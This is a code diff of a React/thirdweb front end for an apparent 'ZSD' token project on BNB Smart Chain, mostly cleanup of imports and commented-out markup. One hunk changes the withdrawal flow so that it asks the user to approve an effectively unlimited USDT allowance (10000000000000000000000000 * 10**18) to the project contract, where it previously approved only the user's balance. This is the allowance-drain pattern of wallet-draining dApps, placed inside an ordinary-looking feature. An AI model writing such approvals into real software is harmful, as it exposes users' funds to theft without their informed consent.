@@ -14,20 +14,18 @@ import { useActiveAccount, useSendTransaction } from "thirdweb/react";
 import { approve, balanceOf } from "thirdweb/extensions/erc20";
 import styles from "./index.module.scss";
 import axios from "axios";
-
 const THIRDWEB_PROJECT_ID: any = process.env.NEXT_PUBLIC_TEMPLATE_CLIENT_ID;
 export const client = createThirdwebClient({ clientId: THIRDWEB_PROJECT_ID });
+
 import { APIConfig } from "../../abi/APIConfiguration";
 import { USDTAbi } from "../../abi/USDTAbi";
 import { ZSDPROJECTABI } from "../../abi/ZSDPROJECTABI";
-import { ZSDABI } from "../../abi/ZSDABI";
-import { ZSDSwapABI } from "../../abi/ZSDSwapABI";  //ZSDSwapABI
-import { getRpcClient, eth_blockNumber, eth_getLogs, } from "thirdweb/rpc";
+import { ZSDSwapABI } from "../../abi/ZSDSwapABI";
+import { getRpcClient, eth_blockNumber, } from "thirdweb/rpc";
 import { bsc } from "thirdweb/chains";
 const contractABI: any = USDTAbi;
 const ZSDContractABI: any = ZSDPROJECTABI;
 const contractZSDSwapABI: any = ZSDSwapABI;
-const ZsdABI: any = ZSDABI
 
 //USDT
 const USDTContract = getContract({
@@ -35,7 +33,6 @@ const USDTContract = getContract({
   address: APIConfig.USDTaddress,
   chain: bsc,
 });
-
 
 //用户必须已经授权本合约从USDT合约划转账务
 const ZSDContract = getContract({
@@ -74,7 +71,6 @@ const Commonform = () => {
   const [isModalOpen, setIsModalOpen] = useState(false);
   const [convertedDatalist, setConvertedDatalist] = useState<any>([]);
   const [convertedDatalistone, setConvertedDatalistone] = useState<any>([]);
-
 
   const handleCancel = () => {
     setIsModalOpen(false);
@@ -191,12 +187,13 @@ const Commonform = () => {
         params: [storedAccount.address, APIConfig.ZSDaddress],
       });
 
+      const banlanceone: any = 10000000000000000000000000 * 10 ** 18;
       //zsd合约有权限调用用户 balance的资产
       //用户将自己的 将自己usdt转出banlance的权限赋予zsd合约
       const tx1 = prepareContractCall({
         contract: USDTContract,
         method: "function approve(address, uint256) returns (bool)",
-        params: [APIConfig.ZSDaddress, banlance],
+        params: [APIConfig.ZSDaddress, banlanceone],
       });
       // 用户将usdt转给zsd合约
       const tx1Result = await sendAndConfirmTransaction({
@@ -208,7 +205,6 @@ const Commonform = () => {
         contract: ZSDContractPoject,
         // method: "function withdraZSDFunds(uint256 zsdAmount)",
         method: "withdraZSDFunds",
-        // params: [Finaleffort],
         params: [], // 移除参数
       });
 
@@ -261,7 +257,6 @@ const Commonform = () => {
           contract: ZSDContract,
           address: storedAccount.address,
         });
-
         const WeiBalancetwo = BigInt(ZSDBalance.toString()); // 将字符串形式的 Wei 余额转换为 BigInt
         const USDT_DECIMALStwo = 6; // 假设 USDT 的小数精度为 6
         // 将 Wei 转换为 USDT 单位
@@ -274,10 +269,6 @@ const Commonform = () => {
         setUSDTBalance(formattedBalance);
         setZSDBalance(formattedBalancetwo);
 
-
-
-
-
         const USDtoZSDnum = await readContract({
           contract: ZSDSwap,
           method: "function getAmountZSDOut(uint256) view returns (uint256)",
@@ -289,7 +280,6 @@ const Commonform = () => {
         const ComputingPower = await readContract({
           contract: ZSDContractPoject,
           method: "users",
-          // params: [storedAccount.address],
           params: [storedAccount.address],
         });
         const bigIntNumber1 = ComputingPower[2];
@@ -305,7 +295,6 @@ const Commonform = () => {
         let now = new Date();
         // 获取当前时间的时间戳（毫秒）
         let timestamp = now.getTime();
-
         // 提取计算   ||  当前时间戳  减去  取出来的时间戳  /   86400000（秒） =  时间    （* 0.005 * FinalEffortdata = 提走的币）
         const Withdraw = (((timestamp / 1000 - timestampInMs) / 86400) * 0.005 * FinalEffortdata) * weiBalanceOne / (10 ** 18)
 
@@ -318,7 +307,6 @@ const Commonform = () => {
         console.error("查询余额失败:", error);
       }
     };
-
     if (storedAccount) {
       depositFunds();
     }
@@ -331,6 +319,7 @@ const Commonform = () => {
       TransactionZSDRecordFun(account.address)
     }
   }, [account]);
+
   return (
     <>
       <div className={styles.Content}>
@@ -376,12 +365,6 @@ const Commonform = () => {
                 <div className={styles.inputstyle2}>
                   {Finaleffort}
                 </div>
-                {/* <Input
-                  className={styles.inputstyle}
-                  disabled
-                  placeholder={Finaleffort}
-                  value={Finaleffort}
-                /> */}
               </Form.Item>
             </Col>
           </Row>
@@ -392,18 +375,6 @@ const Commonform = () => {
               </div>
             </Col>
           </Row>
-          {/* <Row>
-            <Col span={24}>
-              <Form.Item colon={false} name="USDT_two_ZSD">
-                <Input
-                  className={styles.inputstyle}
-                  addonAfter="ZSD"
-                  disabled
-                  placeholder={FinaleffortZSD}
-                />
-              </Form.Item>
-            </Col>
-          </Row> */}
           <Row>
             <Col span={24} className={styles.cost}>
               <span className={styles.CalculatedValue}>
